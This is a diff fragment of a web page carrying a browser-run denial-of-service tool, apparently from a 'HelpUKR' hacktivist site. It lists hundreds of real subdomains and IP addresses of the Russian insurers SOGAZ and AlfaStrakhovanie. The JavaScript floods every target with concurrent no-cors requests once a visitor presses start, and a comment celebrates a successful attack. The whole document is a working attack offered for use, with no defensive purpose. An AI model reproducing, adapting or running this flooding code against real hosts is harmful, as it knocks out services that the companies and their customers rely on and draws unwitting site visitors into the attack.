+		    'https://promo.sogaz.ru',
+		    'https://en.sogaz.ru',
+		    'https://ice-01.telemed.sogaz.ru',
+		    'https://doctor.telemed.sogaz.ru',
+		    'https://www.medonline.sogaz.ru',
+		    'https://opros.sogaz.ru',
+		    'https://micore.sogaz.ru',
+		    'https://auto.sogaz.ru',
+		    'https://mcu-03.telemed.sogaz.ru',
+		    'https://kbm.sogaz.ru',
+		    'https://call.vkteams.sogaz.ru',
+		    'https://adinsure-auth.sogaz.ru',
+		    'https://mcu-01.telemed.sogaz.ru',
+		    'https://rev2.sogaz.ru',
+		    'https://stage.direct.sogaz.ru',
+		    'https://bot.sogaz.ru',
+		    'https://e.sogaz.ru',
+		    'https://adfs.sogaz.ru',
+		    'https://omnichat-test.sogaz.ru',
+		    'https://elt-api-test.sogaz.ru',
+		    'https://app.telemed.sogaz.ru',
+		    'https://www.ds-omnichat.sogaz.ru',
+		    'https://ice-02.telemed.sogaz.ru',
+		    'https://back-office.telemed.sogaz.ru',
+		    'https://admin.telemed.sogaz.ru',
+		    'https://claim.sogaz.ru',
+		    'https://medonline.sogaz.ru',
+		    'https://autodiscover.sogaz.ru',
+		    'https://www.omnichat.sogaz.ru',
+		    'https://ub.vkteams.sogaz.ru',
+		    'https://vkteams.sogaz.ru',
+		    'https://retail.sogaz.ru',
+		    'https://career.sogaz.ru',
+		    'https://admin-telemed.sogaz.ru',
+		    'https://direct.sogaz.ru',
+		    'https://dl.vkteams.sogaz.ru',
+		    'https://u.vkteams.sogaz.ru',
+		    'https://box.sogaz.ru',
+		    'https://rs6.sogaz.ru',
+		    'https://fit.sogaz.ru',
+		    'https://lk.sogaz.ru',
+		    'https://www.adinsure-auth.sogaz.ru',
+		    'https://rev1.sogaz.ru',
+		    'https://www.promo.sogaz.ru',
+		    'https://admin.vkteams.sogaz.ru',
+		    'https://di.vkteams.sogaz.ru',
+		    'https://webim.vkteams.sogaz.ru',
+		    'https://omnichat.sogaz.ru',
+		    'https://parusa.sogaz.ru',
+		    'https://ice-03.telemed.sogaz.ru',
+		    'https://corp.sogaz.ru',
+		    'https://calendar.vkteams.sogaz.ru',
+		    'https://www.mp.sogaz.ru',
+		    'https://back-office.medonline.sogaz.ru',
+		    'https://ds-omnichat.sogaz.ru',
+		    'https://pl.sogaz.ru',
+		    'https://mcu-02.telemed.sogaz.ru',
+		    'https://gpauu.sogaz.ru',
+		    'https://api.vkteams.sogaz.ru',
+		    'https://www.sogaz.ru',
+		    'https://stage.lk.sogaz.ru',
+		    'https://tm.sogaz.ru',
+		    'https://di-dark.vkteams.sogaz.ru',
+		    'https://mail2.sogaz.ru',
+		    'https://coronavirus.sogaz.ru',
+		    'https://adinsure.sogaz.ru',
+		    'https://mp.sogaz.ru',
+		    'https://adinsure-server.sogaz.ru',
+		    'https://rs5.sogaz.ru',
+		    'https://mail.sogaz.ru',
+		    'https://shop.sogaz.ru',
+		    'https://spb.sogaz.ru',
+		    'https://wbx.sogaz.ru',
+		    'https://*.sogaz.ru',
+		    'https://www.fop.sogaz.ru',
+		    'https://jira.sogaz.ru',
+		    'https://edo.sogaz.ru',
+		    'https://prepartner.sogaz.ru',
+		    'https://company.sogaz.ru',
+		    'https://31.177.78.13:443',
+		    'https://185.173.80.96:443',
+		    'https://194.186.171.233:443',
+		    'https://46.229.213.245:443',
+		    'https://185.173.80.26:443',
+        //The Russian Alfastrakh insurance company is not working, claiming that the internet has run out. It's the karmic fate of the aggressor's insurance business. It's a pity that there's no electricity, but considering the direction of their country's movement, it's only a matter of time. Well done, ITtackers, great shot!
+        //alfastrah.ru Targets
+		    'http://alfastrah.ru',
+		    'http://sts.alfastrah.ru',
+		    'http://z14-0313-hap.alfastrah.ru',
+		    'http://www.alfastrah.ru',
+		    'http://opros.alfastrah.ru',
+		    'http://git-nksje.alfastrah.ru',
+		    'http://relay12.alfastrah.ru',
+		    'http://life-portal.alfastrah.ru',
+		    'http://covid.alfastrah.ru',
+		    'http://webimchat.alfastrah.ru',
+		    'http://ti-3.alfastrah.ru',
+		    'http://ti-8.alfastrah.ru',
+		    'http://www.corporate.alfastrah.ru',
+		    'http://relay11.alfastrah.ru',
+		    'http://ti-6.alfastrah.ru',
+		    'http://alfadriver.alfastrah.ru',
+		    'http://apf.alfastrah.ru',
+		    'http://anketa.alfastrah.ru',
+		    'http://life-portal-t.alfastrah.ru',
+		    'http://vesta.alfastrah.ru',
+		    'http://appdynamics.alfastrah.ru',
+		    'http://express.alfastrah.ru',
+		    'http://sbrf.alfastrah.ru',
+		    'http://alfagent.alfastrah.ru',
+		    'http://www.ab.alfastrah.ru',
+		    'http://arktur.alfastrah.ru',
+		    'http://sipwebhook.alfastrah.ru',
+		    'http://conf.alfastrah.ru',
+		    'http://nswebapp.alfastrah.ru',
+		    'http://alfazk.alfastrah.ru',
+		    'http://relay8.alfastrah.ru',
+		    'http://lifeins.alfastrah.ru',
+		    'http://images.alfastrah.ru',
+		    'http://doctors.alfastrah.ru',
+		    'http://vpn1.alfastrah.ru',
+		    'http://dms.alfastrah.ru',
+		    'http://claim.alfastrah.ru',
+		    'http://motivation.alfastrah.ru',
+		    'http://sms.alfastrah.ru',
+		    'http://dadata.alfastrah.ru',
+		    'http://ti-1.alfastrah.ru',
+		    'http://mail.alfastrah.ru',
+		    'http://vp.alfastrah.ru0',
+		    'http://test-alfagent.alfastrah.ru',
+		    'http://ti-4.alfastrah.ru',
+		    'http://nofear.alfastrah.ru',
+		    'http://ns.alfastrah.ru',
+		    'http://ti-nlb2.alfastrah.ru',
+		    'http://inflex.alfastrah.ru',
+		    'http://ab.alfastrah.ru',
+		    'http://ir.alfastrah.ru',
+		    'http://host-11.alfastrah.ru',
+		    'http://beeline.alfastrah.ru',
+		    'http://vpn2.alfastrah.ru',
+		    'http://owa.alfastrah.ru',
+		    'http://ti-test2.alfastrah.ru',
+		    'http://relay9.alfastrah.ru',
+		    'http://z14-0312-hap.alfastrah.ru',
+		    'http://wsm.alfastrah.ru',
+		    'http://cashback2.alfastrah.ru',
+		    'http://mobile.alfastrah.ru',
+		    'http://2021.alfastrah.ru',
+		    'http://pki1.alfastrah.ru',
+		    'http://coronavirus.alfastrah.ru',
+		    'http://ti-5.alfastrah.ru',
+		    'http://bmwa.alfastrah.ru',
+		    'http://it-tender.alfastrah.ru',
+		    'http://ti.alfastrah.ru',
+		    'http://futureservice.alfastrah.ru',
+		    'http://otb.alfastrah.ru',
+		    'http://ebrg.alfastrah.ru',
+		    'http://career.alfastrah.ru',
+		    'http://fscm-sap-cs.alfastrah.ru',
+		    'http://relay7.alfastrah.ru',
+		    'http://b2b-test2.alfastrah.ru',
+		    'http://relay6.alfastrah.ru',
+		    'http://report.wsm.alfastrah.ru',
+		    'http://ti2.alfastrah.ru',
+		    'http://corporate.alfastrah.ru',
+		    'http://bm.alfastrah.ru',
+		    'http://pass.alfastrah.ru',
+		    'http://ti-7.alfastrah.ru',
+		    'http://telesales.alfastrah.ru',
+		    'http://mortgage.alfastrah.ru',
+		    'http://www.vp.alfastrah.ru',
+		    'http://tis2.alfastrah.ru',
+		    'http://aspbroker.alfastrah.ru',
+		    'http://alfapolicy03.alfastrah.ru',
+		    'http://vsd.alfastrah.ru',
+		    'http://relay3.alfastrah.ru',
+		    'http://cashback.alfastrah.ru',
+		    'http://cdn.alfastrah.ru',
+		    'http://vpn3.alfastrah.ru',
+		    'http://b2b.alfastrah.ru',
+		    'http://alfapoints.alfastrah.ru',
+		    'http://www.sbrf.alfastrah.ru',
+		    'http://dev-alfagent.alfastrah.ru',
+		    'http://hr-dms.alfastrah.ru',
+		    'http://business.alfastrah.ru',
+		    'http://agent.alfastrah.ru',
+		    'http://lifepoint-upd.alfastrah.ru',
+		    'http://195.239.64.26',
+		    'http://195.239.64.131',
+		    'http://178.248.234.43',
+		    'http://178.154.225.87',
+		    'http://84.252.136.52',
+		    'http://84.201.190.85',
+		    'http://195.239.64.162',
+		    'http://178.154.201.32',
+		    'http://84.201.184.173',
+		    'http://195.239.64.138',
+		    'http://195.239.64.174',
+		    'http://178.218.220.86',
+		    'http://84.201.191.22',
+		    'http://195.239.64.164',
+		    'http://77.246.156.47',
+		    'http://130.193.51.21',
+		    'http://178.248.237.230',
+		    'http://195.239.64.227',
+		    'http://178.248.236.135',
+		    'http://185.247.194.59',
+		    'http://195.239.64.93',
+		    'http://195.239.64.211',
+		    'http://195.239.64.7',
+		    'http://195.239.64.102',
+		    'http://195.239.64.47',
+		    'http://195.239.64.149',
+		    'http://195.239.64.55',
+		    'http://195.239.64.160',
+		    'http://195.239.64.43',
+		    'http://178.154.225.208',
+		    'http://213.33.175.194',
+		    'http://195.239.64.56',
+		    'http://194.67.106.153',
+		    'http://195.239.64.202',
+		    'http://51.250.71.79',
+		    'http://195.239.64.231',
+		    'http://195.239.64.139',
+		    'http://195.239.64.141',
+		    'http://195.239.64.11',
+		    'http://195.239.64.252',
+		    'http://195.239.64.132',
+		    'http://195.239.64.130',
+		    'http://77.246.156.107',
+		    'http://195.239.64.95',
+		    'http://195.239.64.140',
+		    'http://195.239.64.42',
+		    'http://195.239.64.235',
+		    'http://195.239.64.166',
+		    'http://195.239.64.241',
+		    'http://195.239.64.163',
+		    'http://84.201.173.209',
+		    'http://195.239.64.175',
+		    'http://195.239.64.41',
+		    'http://51.250.15.196',
+		    'http://195.239.64.165',
+		    'http://195.239.64.232',
+		    'http://195.239.64.229',
+		    'http://195.239.64.59',
+		    'http://195.239.64.226',
+		    'http://195.239.64.178',
+		    'http://195.239.64.154',
+		    'http://195.239.64.172',
+		    'http://178.248.232.153',
+		    'http://84.201.184.245',
+		    'http://195.239.64.216',
+		    'https://alfastrah.ru',
+		    'https://sts.alfastrah.ru',
+		    'https://z14-0313-hap.alfastrah.ru',
+		    'https://www.alfastrah.ru',
+		    'https://opros.alfastrah.ru',
+		    'https://git-nksje.alfastrah.ru',
+		    'https://relay12.alfastrah.ru',
+		    'https://life-portal.alfastrah.ru',
+		    'https://covid.alfastrah.ru',
+		    'https://webimchat.alfastrah.ru',
+		    'https://ti-3.alfastrah.ru',
+		    'https://ti-8.alfastrah.ru',
+		    'https://www.corporate.alfastrah.ru',
+		    'https://relay11.alfastrah.ru',
+		    'https://ti-6.alfastrah.ru',
+		    'https://alfadriver.alfastrah.ru',
+		    'https://apf.alfastrah.ru',
+		    'https://anketa.alfastrah.ru',
+		    'https://life-portal-t.alfastrah.ru',
+		    'https://vesta.alfastrah.ru',
+		    'https://appdynamics.alfastrah.ru',
+		    'https://express.alfastrah.ru',
+		    'https://sbrf.alfastrah.ru',
+		    'https://alfagent.alfastrah.ru',
+		    'https://www.ab.alfastrah.ru',
+		    'https://arktur.alfastrah.ru',
+		    'https://sipwebhook.alfastrah.ru',
+		    'https://conf.alfastrah.ru',
+		    'https://nswebapp.alfastrah.ru',
+		    'https://alfazk.alfastrah.ru',
+		    'https://relay8.alfastrah.ru',
+		    'https://lifeins.alfastrah.ru',
+		    'https://images.alfastrah.ru',
+		    'https://doctors.alfastrah.ru',
+		    'https://vpn1.alfastrah.ru',
+		    'https://dms.alfastrah.ru',
+		    'https://claim.alfastrah.ru',
+		    'https://motivation.alfastrah.ru',
+		    'https://sms.alfastrah.ru',
+		    'https://dadata.alfastrah.ru',
+		    'https://ti-1.alfastrah.ru',
+		    'https://mail.alfastrah.ru',
+		    'https://vp.alfastrah.ru0',
+		    'https://test-alfagent.alfastrah.ru',
+		    'https://ti-4.alfastrah.ru',
+		    'https://nofear.alfastrah.ru',
+		    'https://ns.alfastrah.ru',
+		    'https://ti-nlb2.alfastrah.ru',
+		    'https://inflex.alfastrah.ru',
+		    'https://ab.alfastrah.ru',
+		    'https://ir.alfastrah.ru',
+		    'https://host-11.alfastrah.ru',
+		    'https://beeline.alfastrah.ru',
+		    'https://vpn2.alfastrah.ru',
+		    'https://owa.alfastrah.ru',
+		    'https://ti-test2.alfastrah.ru',
+		    'https://relay9.alfastrah.ru',
+		    'https://z14-0312-hap.alfastrah.ru',
+		    'https://wsm.alfastrah.ru',
+		    'https://cashback2.alfastrah.ru',
+		    'https://mobile.alfastrah.ru',
+		    'https://2021.alfastrah.ru',
+		    'https://pki1.alfastrah.ru',
+		    'https://coronavirus.alfastrah.ru',
+		    'https://ti-5.alfastrah.ru',
+		    'https://bmwa.alfastrah.ru',
+		    'https://it-tender.alfastrah.ru',
+		    'https://ti.alfastrah.ru',
+		    'https://futureservice.alfastrah.ru',
+		    'https://otb.alfastrah.ru',
+		    'https://ebrg.alfastrah.ru',
+		    'https://career.alfastrah.ru',
+		    'https://fscm-sap-cs.alfastrah.ru',
+		    'https://relay7.alfastrah.ru',
+		    'https://b2b-test2.alfastrah.ru',
+		    'https://relay6.alfastrah.ru',
+		    'https://report.wsm.alfastrah.ru',
+		    'https://ti2.alfastrah.ru',
+		    'https://corporate.alfastrah.ru',
+		    'https://bm.alfastrah.ru',
+		    'https://pass.alfastrah.ru',
+		    'https://ti-7.alfastrah.ru',
+		    'https://telesales.alfastrah.ru',
+		    'https://mortgage.alfastrah.ru',
+		    'https://www.vp.alfastrah.ru',
+		    'https://tis2.alfastrah.ru',
+		    'https://aspbroker.alfastrah.ru',
+		    'https://alfapolicy03.alfastrah.ru',
+		    'https://vsd.alfastrah.ru',
+		    'https://relay3.alfastrah.ru',
+		    'https://cashback.alfastrah.ru',
+		    'https://cdn.alfastrah.ru',
+		    'https://vpn3.alfastrah.ru',
+		    'https://b2b.alfastrah.ru',
+		    'https://alfapoints.alfastrah.ru',
+		    'https://www.sbrf.alfastrah.ru',
+		    'https://dev-alfagent.alfastrah.ru',
+		    'https://hr-dms.alfastrah.ru',
+		    'https://business.alfastrah.ru',
+		    'https://agent.alfastrah.ru',
+		    'https://lifepoint-upd.alfastrah.ru',
+		    'https://195.239.64.26',
+		    'https://195.239.64.131',
+		    'https://178.248.234.43',
+		    'https://178.154.225.87',
+		    'https://84.252.136.52',
+		    'https://84.201.190.85',
+		    'https://195.239.64.162',
+		    'https://178.154.201.32',
+		    'https://84.201.184.173',
+		    'https://195.239.64.138',
+		    'https://195.239.64.174',
+		    'https://178.218.220.86',
+		    'https://84.201.191.22',
+		    'https://195.239.64.164',
+		    'https://77.246.156.47',
+		    'https://130.193.51.21',
+		    'https://178.248.237.230',
+		    'https://195.239.64.227',
+		    'https://178.248.236.135',
+		    'https://185.247.194.59',
+		    'https://195.239.64.93',
+		    'https://195.239.64.211',
+		    'https://195.239.64.7',
+		    'https://195.239.64.102',
+		    'https://195.239.64.47',
+		    'https://195.239.64.149',
+		    'https://195.239.64.55',
+		    'https://195.239.64.160',
+		    'https://195.239.64.43',
+		    'https://178.154.225.208',
+		    'https://213.33.175.194',
+		    'https://195.239.64.56',
+		    'https://194.67.106.153',
+		    'https://195.239.64.202',
+		    'https://51.250.71.79',
+		    'https://195.239.64.231',
+		    'https://195.239.64.139',
+		    'https://195.239.64.141',
+		    'https://195.239.64.11',
+		    'https://195.239.64.252',
+		    'https://195.239.64.132',
+		    'https://195.239.64.130',
+		    'https://77.246.156.107',
+		    'https://195.239.64.95',
+		    'https://195.239.64.140',
+		    'https://195.239.64.42',
+		    'https://195.239.64.235',
+		    'https://195.239.64.166',
+		    'https://195.239.64.241',
+		    'https://195.239.64.163',
+		    'https://84.201.173.209',
+		    'https://195.239.64.175',
+		    'https://195.239.64.41',
+		    'https://51.250.15.196',
+		    'https://195.239.64.165',
+		    'https://195.239.64.232',
+		    'https://195.239.64.229',
+		    'https://195.239.64.59',
+		    'https://195.239.64.226',
+		    'https://195.239.64.178',
+		    'https://195.239.64.154',
+		    'https://195.239.64.172',
+		    'https://178.248.232.153',
+		    'https://84.201.184.245',
+		    'https://195.239.64.216',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
